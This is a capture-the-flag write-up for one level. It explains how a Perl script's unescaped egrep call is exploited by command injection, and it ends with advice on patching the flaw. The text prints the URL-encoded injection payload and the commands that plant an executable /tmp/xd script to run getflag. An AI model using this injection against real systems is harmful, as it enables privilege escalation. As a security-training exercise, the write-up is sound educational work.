## level12

- **How we found it**  
  
	Inspected `level12.perl` and saw it runs:

	```perl
	egrep "^$xx" /tmp/xd 2>&1
	```

	where `$xx` is derived from user input (converted to uppercase).

- **How we exploited it**

	**1.** Injected a payload that breaks the `egrep` command and backgrounds it, then runs our own code:

	```bash
	# Decoded:    "&A=A"
	# URL‑encoded: %22%26A%3DA%22
	```

	**2.** This turns the shell line into:
	
	```bash
	egrep "^"&A=A /tmp/xd 2>&1
	```

	`egrep` is backgrounded, and `A=A` makes bash knows we want to run something runs next, letting us continue.

	**3.** Created a malicious /tmp/xd script to call getflag:

	```bash
	echo -e '#!/bin/sh\ngetflag' > /tmp/xd
	chmod +x /tmp/xd
	```

- **Utility of this exercise**
	
	Demonstrates how unescaped user input in Perl’s backticks or system/egrep calls can lead to command injection and privilege escalation.

- **How to patch**

	- **Validate or escape** user input before embedding in shell commands (e.g. `quotemeta` in Perl).
	
	- **Use in‑process regex** instead of shelling out.

	- **Drop elevated privileges** before processing user data, or eliminate the setuid bit if not required.